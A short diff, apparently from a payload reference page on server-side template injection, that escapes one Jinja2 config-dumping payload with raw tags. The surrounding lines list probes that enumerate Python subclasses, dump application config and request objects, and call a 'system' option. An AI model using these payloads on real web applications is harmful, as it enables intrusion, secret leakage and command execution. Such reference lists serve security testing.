@@ -46,7 +46,7 @@ We will brute force to identify the correct payload based on Jinja2:
 {{ [].class.base.subclasses() }}
 {{''.class.mro()[1].subclasses()}}
 {{ ''.__class__.__mro__[2].__subclasses__() }}
-{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
+{% raw %}{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}{% endraw %}
 {{ request }}
 {{self}}
 {{app.request.query.filter(0,0,1024,{'options':'system'})}}
